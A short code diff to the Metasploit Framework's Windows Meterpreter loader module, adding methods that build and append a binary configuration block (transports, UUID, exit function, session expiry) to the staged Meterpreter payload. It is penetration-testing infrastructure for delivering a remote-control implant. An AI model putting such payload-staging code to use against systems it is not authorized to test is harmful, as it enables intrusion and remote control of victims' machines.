@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/reflective_dll_loader'
+require 'rex/payloads/meterpreter/config'
 
 module Msf
 
@@ -64,6 +65,31 @@ module Payload::Windows::MeterpreterLoader
           push eax              ; push some arbitrary value for hInstance
           call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
     ^
+  end
+
+  def stage_payload(opts={})
+    stage_meterpreter(opts) + generate_config(opts)
+  end
+
+  def generate_config(opts={})
+    ds = opts[:datastore] || datastore
+    opts[:uuid] ||= generate_payload_uuid
+
+    # create the configuration block, which for staged connections is really simple.
+    config_opts = {
+      arch:       opts[:uuid].arch,
+      exitfunk:   ds['EXITFUNC'],
+      expiration: ds['SessionExpirationTimeout'].to_i,
+      uuid:       opts[:uuid],
+      transports: opts[:transport_config] || [transport_config(opts)],
+      extensions: []
+    }
+
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+
+    # return the binary version of it
+    config.to_b
   end
 
   def stage_meterpreter(opts={})
